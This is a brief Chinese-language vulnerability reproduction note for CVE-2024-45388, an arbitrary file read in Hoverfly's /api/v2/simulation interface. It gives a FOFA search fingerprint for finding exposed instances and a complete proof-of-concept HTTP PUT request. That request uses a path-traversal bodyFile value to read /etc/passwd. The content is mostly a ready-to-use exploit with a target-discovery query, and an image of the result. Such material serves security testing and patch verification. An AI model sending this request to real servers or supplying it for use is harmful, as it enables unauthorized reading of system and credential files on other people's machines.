# Hoverfly系统接口simulation任意文件读取漏洞复现(CVE-2024-45388)

Hoverfly api/v2/simulation 接口存在任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。

## fofa

```jade
icon_hash="1357234275"
```

## poc

```javascript
PUT /api/v2/simulation HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
 
{"data":{"pairs":[{"request":{},"response":{"bodyFile": "../../../../../../../etc/passwd","x":"aaa"}} ]},"meta":{"schemaVersion":"v5.3"}}
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409101027771.png)